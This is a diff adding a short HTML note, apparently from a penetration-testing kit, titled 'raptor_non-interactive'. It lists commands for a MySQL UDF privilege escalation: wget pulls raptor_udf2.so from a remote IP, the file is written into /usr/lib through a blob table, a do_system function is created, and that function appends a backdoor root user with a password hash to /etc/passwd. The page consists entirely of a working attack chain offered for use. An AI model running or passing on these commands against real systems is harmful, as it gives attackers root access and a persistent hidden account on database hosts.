@@ -1,0 +1,15 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>raptor_non-interactive</title>
+</head><body>If you can only execute commands interactively, mysql command line can help you<br/>
+<br/>
+wget 10.11.0.53:53/raptor_udf2.so -O /tmp/me.so<br/>
+mysql -u root -P "" -D mysql -e "drop table foo;"<br/>
+mysql -u root -P "" -D mysql -e "create table foo(line blob);"<br/>
+mysql -u root -P "" -D mysql -e "insert into foo values(load_file(\"/tmp/me.so\"));"<br/>
+mysql -u root -P "" -D mysql -e "select * from foo into dumpfile \"/usr/lib/me.so\";"<br/>
+mysql -u root -P "" -D mysql -e "create function do_system returns integer soname \"me.so\";"<br/>
+mysql -u root -P "" -D mysql -e "select * from mysql.func;"<br/>
+mysql -u root -P "" -D mysql -e "select do_system(\"echo 'reward1:\$1\$reward1\$H2gwNHo7p4.a/0N1S1Ct5/:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd\");"</body></html>
